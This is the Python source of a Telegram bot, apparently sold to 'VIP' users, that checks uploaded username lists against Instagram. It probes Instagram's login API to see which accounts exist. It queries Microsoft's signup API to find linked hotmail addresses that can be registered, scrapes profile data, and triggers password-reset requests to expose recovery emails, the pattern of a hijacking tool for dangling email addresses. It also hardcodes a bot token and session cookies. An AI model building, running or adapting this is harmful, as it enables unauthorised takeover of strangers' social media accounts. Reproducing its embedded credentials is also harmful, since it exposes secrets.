import requests
import telebot
from telebot import types
from uuid import uuid4
import random
import os, re
from re import search
import json
from user_agent import generate_user_agent
import sys
from datetime import datetime
from bs4 import BeautifulSoup
import secrets
import logging

# إعداد تسجيل الأخطاء
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='bot_log.log')

cokie = secrets.token_hex(8) * 2
session_count = 0
token = "7544304598:AAG8rios5ORwjqAwTvzahYEOX73dWSqa05U"

# تعيين التاريخ المستقبلي الذي يتوقف عنده الكود (7 أغسطس 2024)
stop_date = datetime(2024, 8, 28, 0, 0, 0)  # (السنة، الشهر، اليوم، الساعة، الدقيقة، الثانية)

# Dictionary to track scanning status per user
scanning_status = {}
paused_status = {}
# VIP users list
vip_users = set()

def load_vip_users():
    global vip_users
    try:
        with open('vip_users.txt', 'r') as file:
            vip_users = set(line.strip() for line in file)
    except FileNotFoundError:
        vip_users = set()

def save_vip_users():
    with open('vip_users.txt', 'w') as file:
        for user_id in vip_users:
            file.write(f"{user_id}\n")

load_vip_users()

bot = telebot.TeleBot(token)
current_time = datetime.now()

def is_vip(user_id):
    return str(user_id) in vip_users

@bot.message_handler(commands=['start'])
def start(message):
    global session_count
    session_count += 1
    first_name = message.from_user.first_name
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = datetime.now()
    welcome_message = f'''
⋆⁺₊⋆ ☾ 𝒲𝑒𝓁𝒸𝑜𝓂𝑒, {first_name} ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝒰𝓈𝑒𝓇𝓃𝒶𝓂𝑒 || @{username} ✧
✧ 𝒮𝑒𝓈𝓈𝒾𝑜𝓃 𝒩𝓊𝓂𝒷𝑒𝓇 || {session_count} ✧
✧ 𝒟𝑒𝓋𝑒𝓁𝑜𝓅𝑒𝓇 || @he3uh ✧
✧ 𝒞𝒽𝒶𝓃𝓃𝑒𝓁 || @pyTerm1 ✧
✦✧✦✧✦✧✦✧✦✧✦
'''
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🔍 Start Scanning"),
        types.KeyboardButton("🗑️ Delete List"),
        types.KeyboardButton("ℹ️ Info"),
        types.KeyboardButton("🔄 Reset Scan"),
        types.KeyboardButton("➕ Add VIP"),
        types.KeyboardButton("➖ Remove VIP"),
        types.KeyboardButton("⏸️ Pause Scan"),
        types.KeyboardButton("📈 View Scan Stats"),
        types.KeyboardButton("📊 Generate Report")
    )
    bot.send_message(message.chat.id, welcome_message, parse_mode="html", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔍 Start Scanning")
def handle_start_scan(message):
    user_id = message.chat.id
    if not is_vip(user_id):
        bot.send_message(user_id, "🚫 You must be a VIP user to start scanning.")
        return

    if scanning_status.get(user_id, False):
        bot.send_message(user_id, "🚫 You already have an ongoing scan. Please wait until it finishes.")
    else:
        scanning_status[user_id] = True
        paused_status[user_id] = False
        bot.send_message(user_id, "📂 Please send your list for scanning.")
        bot.register_next_step_handler(message, k1, message.id)

@bot.message_handler(func=lambda message: message.text == "🗑️ Delete List")
def handle_delete_list(message):
    bot.send_message(message.chat.id, '🗑️ Type "delete" to remove the list')
    bot.register_next_step_handler(message, delete_list)

@bot.message_handler(func=lambda message: message.text == "🔄 Reset Scan")
def handle_reset_scan(message):
    user_id = message.chat.id
    scanning_status[user_id] = False
    paused_status[user_id] = False
    bot.send_message(user_id, "🔄 Scanning status has been reset.")

@bot.message_handler(func=lambda message: message.text == "ℹ️ Info")
def handle_info(message):
    display_info(message)

@bot.message_handler(func=lambda message: message.text == "➕ Add VIP")
def handle_add_vip(message):
    if message.from_user.id == 6016780280:  # Replace with the developer's user ID
        bot.send_message(message.chat.id, "Please enter the User ID to add to VIP:")
        bot.register_next_step_handler(message, add_vip_user)
    else:
        bot.send_message(message.chat.id, "🚫 You do not have permission to use this command.")

def add_vip_user(message):
    try:
        user_id = message.text.strip()
        if user_id.isdigit():
            vip_users.add(user_id)
            save_vip_users()
            bot.send_message(message.chat.id, f"User {user_id} has been added to VIP list.")
        else:
            bot.send_message(message.chat.id, "🚫 Invalid User ID.")
    except Exception as e:
        logging.error(f"Error adding VIP user: {e}")
        bot.send_message(message.chat.id, f"🚫 Error: {e}")

@bot.message_handler(func=lambda message: message.text == "➖ Remove VIP")
def handle_remove_vip(message):
    if message.from_user.id == 6016780280:  # Ensure the user is the developer
        bot.send_message(message.chat.id, "Please enter the User ID to remove from VIP:")
        bot.register_next_step_handler(message, remove_vip_user)
    else:
        bot.send_message(message.chat.id, "🚫 You do not have permission to use this command.")

def remove_vip_user(message):
    try:
        user_id = message.text.strip()
        if user_id in vip_users:
            vip_users.discard(user_id)
            save_vip_users()
            bot.send_message(message.chat.id, f"User {user_id} has been removed from VIP list.")
        else:
            bot.send_message(message.chat.id, "🚫 User ID not found in VIP list.")
    except Exception as e:
        logging.error(f"Error removing VIP user: {e}")
        bot.send_message(message.chat.id, f"🚫 Error: {e}")

@bot.message_handler(func=lambda message: message.text == "⏸️ Pause Scan")
def handle_pause_scan(message):
    user_id = message.chat.id
    if scanning_status.get(user_id, False):
        paused_status[user_id] = True
        bot.send_message(user_id, "⏸️ The scanning process has been paused.")
    else:
        bot.send_message(user_id, "🚫 There is no ongoing scan to pause.")

@bot.message_handler(func=lambda message: message.text == "📈 View Scan Stats")
def handle_view_stats(message):
    user_id = message.chat.id
    stats = f"📊 Current Session: {session_count}\n📂 Scanning Status: {'Active' if scanning_status.get(user_id, False) else 'Inactive'}"
    bot.send_message(message.chat.id, stats)

@bot.message_handler(func=lambda message: message.text == "📊 Generate Report")
def handle_generate_report(message):
    user_id = message.chat.id
    report = f'''
⋆⁺₊⋆ ☾ 𝒮𝒸𝒶𝓃 𝑅𝑒𝓅𝓸𝓇𝓉 ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝒟𝒶𝓉𝑒 || {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ✧
✧ 𝒮𝒸𝒶𝓃𝓃𝒾𝓃𝑔 𝒮𝓉𝒶𝓉𝓊𝓈 || {'Active' if scanning_status.get(user_id, False) else 'Inactive'} ✧
✧ 𝒮𝑒𝓈𝓈𝒾𝑜𝓃 𝒞𝓸𝓊𝓃𝓉 || {session_count} ✧
    '''
    bot.send_message(message.chat.id, report, parse_mode="html")

def k1(message, id):
    user_id = message.from_user.id
    iid = str(user_id)
    aol1 = 0
    face1 = 0
    face2 = 0
    aol2 = 0
    eerr = 0
    zzoy = 0
    addad = 0
    scanning_issues = 0
    failed_checks = 0
    
    try:
        filename = message.document.file_name
        file_info = bot.get_file(message.document.file_id)
        use = bot.download_file(file_info.file_path)        
        with open(f'userzaidtool{iid}.txt', 'wb') as zaidno:
            zaidno.write(use)
        bot.send_message(message.chat.id, "✅ File received, starting the scan...", parse_mode="html")
    except Exception as e:
        bot.send_message(message.chat.id, f"<strong>🚫 Error with the file: {e}</strong>", parse_mode="html")
        logging.error(f"File processing error: {e}")
        return

    try:
        file = open(f'userzaidtool{iid}.txt', 'r').read().splitlines()
        addd = len(file)
    except FileNotFoundError:
        bot.send_message(message.chat.id, f"<strong>🚫 Error or problem occurred!</strong>", parse_mode="html")
        logging.error("File not found error during scanning.")
        return

    for zood in file:
        # تحقق من التاريخ المحدد للتوقف عنده
        current_time = datetime.now()
        if current_time >= stop_date:
            bot.send_message(message.chat.id, "🚫 Scanning has stopped as the end date has been reached.")
            scanning_status[user_id] = False
            return
        
        addad += 1
        zzoy += 1
        if paused_status.get(user_id, False):
            bot.send_message(message.chat.id, "⏸️ Scan paused. Use 'Reset Scan' to restart.", parse_mode="html")
            return
        
        try:
            email = zood.split('@')[0] + '@hotmail.com'
        except:
            email = zood + '@hotmail.com'
            eerr += 1                
            continue

        try:
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Cookie': 'missing',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
            }

            uid = str(uuid4())
            data = {
                'uuid': uid, 
                'password': 'ffffdddddaaa666', 
                'username': email,
                'device_id': uid, 
                'from_reg': 'false', 
                '_csrftoken': 'missing', 
                'login_attempt_count': '0'
            }
            
            re = requests.post(url, headers=headers, data=data).text
            if '"The username you entered ' in re:
                face2 += 1
            elif '"bad_password"' in re:
                face1 += 1
                email = email.split('@')[0] + '@hotmail.com'
                try:
                    reqz = requests.Session()
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
                        "Host": "signup.live.com",
                        "Connection": "keep-alive",
                        "X-Requested-With": "XMLHttpRequest"
                    }
                    url = "https://signup.live.com/signup.aspx?lic=1"
                    response = reqz.get(url, headers=headers)
                    apiCanary = search("apiCanary\":\"(.+?)\",", str(response.content)).group(1)
                    apiCanary = str.encode(apiCanary).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                    url  = "https://signup.live.com/API/CheckAvailableSigninNames"
                    json = {
                        "signInName": email,
                        "includeSuggestions": True
                    }
                    res = reqz.post(url, headers={
                        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                        "canary": apiCanary
                    }, json=json)
                except Exception as e:
                    eerr += 1
                    logging.error(f"Error during email validation: {e}")
                    continue

                if res.json().get("isAvailable") == False:
                    aol2 += 1                    
                else:
                    aol1 += 1
                    try:
                        user = email.split('@')[0]
                        urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
                        he = {
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US',
                            'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821\05454664153777\0541693612516:01f74576c135f7872fb73886ff7479191f1a2dbcd8ca945a5b5128653ccba468ed1e0311"; shbts="1662076516\05454664153777\0541693612516:01f7ecb709528c535487eb415ab7712a01bac5b97db1740800a0c3d687a730cbd7e00135"; csrftoken=V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
                            'origin': 'https://www.instagram.com',
                            'referer': 'https://www.instagram.com/',
                            'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-site',
                            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                            'x-asbd-id': '198387',
                            'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': '0',
                        }

                        re = requests.get(urlg, headers=he).json()
                        io = re['data']['user']['biography']
                        fol = re['data']['user']['edge_followed_by']['count']
                        fos = re['data']['user']['edge_follow']['count']
                        ido = re['data']['user']['id']
                        nam = re['data']['user']['full_name']
                        isp = re['data']['user']['is_private']
                        op = re['data']['user']['edge_owner_to_timeline_media']['count']
                        try:
                            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={ido}")   
                            ree = re.json()
                            date = ree['date']
                        except:
                            date = "No Data"
                            logging.error("Error retrieving account creation date.")
                        
                        heeee = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': generate_user_agent(),
                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                            'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
                        }
                        daaa = {
                            'ig_sig_key_version': '4',
                            "user_id": ido
                        }
                        urr = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'

                        try:
                            reeee = requests.post(urr, headers=heeee, data=daaa).json()
                            rest = reeee.get('obfuscated_email', 'No Rest')
                        except:
                            rest = 'No Rest'
                            logging.error("Error during password reset request.")

                        result_message = f'''
⋆⁺₊⋆ ☾ 𝒩𝑒𝓌 𝒜𝒸𝒸𝓸𝓊𝓃𝓉 ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝒜𝒸𝒸𝓸𝓊𝓃𝓉 𝒩𝒶𝓂𝑒 || {nam} ✧
✧ 𝒰𝓈𝑒𝓇𝓃𝒶𝓂𝑒 || @{user} ✧
✧ 𝐼𝒟 || {ido} ✧
✧ 𝐸𝓂𝒶𝒾𝓁 || {email} ✧
✧ 𝐹𝑜𝓁𝓁𝑜𝓌𝑒𝓇𝓈 || {fol} ✧
✧ 𝐹𝑜𝓁𝓁𝑜𝓌𝒾𝓃𝑔 || {fos} ✧
✧ 𝒞𝓇𝑒𝒶𝓉𝒾𝑜𝓃 𝒟𝒶𝓉𝑒 || {date} ✧
✧ 𝒫𝓸𝓈𝓉𝓈 || {op} ✧
✧ 𝒫𝓊𝒷𝓁𝒾𝒸/𝒫𝓇𝒾𝓋𝒶𝓉𝑒 || {"Private" if isp else "Public"} ✧
✧ 𝑅𝑒𝓈𝑒𝓉 𝐸𝓂𝒶𝒾𝓁 || {rest} ✧
✦✧✦✧✦✧✦✧✦✧✦
'''
                        bot.send_message(message.chat.id, result_message, parse_mode="html")

                    except Exception as e:
                        logging.error(f"Error retrieving Instagram data: {e}")
                        bot.send_message(message.chat.id, f'''
⋆⁺₊⋆ ☾ 🚫 𝑵𝒐𝒕 𝑭𝒐𝓾𝓃𝓭 𝒐𝓃 𝑰𝒏𝓼𝒕𝒂𝓰𝓻𝒂𝓶 ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝑬𝒎𝒂𝒊𝓁 || {email} ✧
✧ 𝑫𝒆𝒗 || @he3uh ✧
✦✧✦✧✦✧✦✧✦✧✦
                        ''', parse_mode="html")
                        failed_checks += 1
            else:
                failed_checks += 1
        except Exception as e:
            logging.error(f"An error occurred during the scanning process: {e}")
            bot.send_message(message.chat.id, f"🚫 An error occurred: {e}")
            scanning_issues += 1

    summary_message = f'''
⋆⁺₊⋆ ☾ 𝒮𝒸𝒶𝓃 𝒮𝓊𝓂𝓂𝒶𝓇𝓎 ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝒯𝓸𝓽𝓪𝓁 𝒞𝒽𝑒𝒸𝓀𝓈 || {addad} ✧
✧ 𝒮𝓊𝒸𝒸𝑒𝓈𝓈𝒻𝓊𝓁 𝒞𝒽𝑒𝒸𝓀𝓈 || {face1} ✧
✧ 𝑼𝓃𝓈𝓊𝒸𝒸𝑒𝓈𝓈𝒻𝓊𝓁 𝒞𝒽𝑒𝒸𝓴𝓈 || {face2} ✧
✧ 𝑵𝓸𝓽 𝑨𝓋𝓪𝓲𝓁𝒶𝒷𝓁𝑒 𝒪𝓃 𝐼𝓃𝓈𝓉𝒶𝑔𝓇𝒶𝓂 || {aol2} ✧
✧ 𝑨𝓋𝓪𝒾𝓁𝒶𝒷𝓁𝑒 𝒪𝓃 𝐼𝓃𝓈𝓉𝒶𝑔𝓇𝒶𝓂 || {aol1} ✧
✧ 𝒮𝓬𝒶𝓃 𝐼𝓈𝓈𝓊𝑒𝓈 || {eerr} ✧
✧ 𝑶𝓽𝓱𝑒𝓇 𝒮𝓬𝒶𝓃𝓃𝒾𝓃𝑔 𝐼𝓈𝓈𝓊𝑒𝓈 || {scanning_issues} ✧
✦✧✦✧✦✧✦✧✦✧✦
    '''
    bot.send_message(message.chat.id, summary_message, parse_mode="html")

    os.remove(f'userzaidtool{iid}.txt')
    scanning_status[user_id] = False  # Mark scanning as completed

def delete_list(message):
    user_id = str(message.from_user.id)
    text_input = str(message.text)
    if 'delete' in text_input.lower():
        try:
            os.remove(f'user_scan_{user_id}.txt')
            bot.send_message(message.chat.id, "🗑️ The old list has been deleted", parse_mode="html")
        except FileNotFoundError:
            bot.send_message(message.chat.id, "🚫 No file found to delete", parse_mode="html")
    else:
        bot.send_message(message.chat.id, "🚫 The word is incorrect, please try again", parse_mode="html")

@bot.message_handler(commands=["info"])
def display_info(message):
    global session_count
    session_count += 1
    current_time = datetime.now()
    first_name = message.from_user.first_name
    user_id = message.from_user.id
    username = message.from_user.username
    bio = bot.get_chat(message.from_user.id).bio
    
    info_message = f'''
⋆⁺₊⋆ ☾ 𝑼𝒔𝒆𝒓 𝑰𝒏𝒇𝒐 ☽ ⋆⁺₊⋆
✦✧✦✧✦✧✦✧✦✧✦
✧ 𝑵𝒂𝒎𝒆 || {first_name} ✧
✧ 𝑼𝒔𝒆𝓇𝓃𝒶𝓂𝑒 || @{username} ✧
✧ 𝑰𝑫 || {user_id} ✧
✧ 𝑩𝒊𝓸 || {bio} ✧
✦✧✦✧✦✧✦✧✦✧✦
- ⚙️ 𝑫𝒆𝒗𝒆𝓁𝓸𝒑𝒆𝓇 || @he3uh
- 📢 𝑪𝒉𝒂𝒏𝓃𝑒𝓁 || https://t.me/pyTerm1
    '''
    bot.send_message(message.chat.id, info_message, parse_mode="html")

while True:
    try:
        # تحقق من التاريخ قبل متابعة التكرار
        current_time = datetime.now()
        if current_time >= stop_date:
            print("لقد انتهت مدة التشغيل. سيتم إيقاف البوت.")
            break

        bot.infinity_polling()
    except Exception as e:
        logging.error(f"Error in bot polling: {e}")
        print(f"Error: {e}")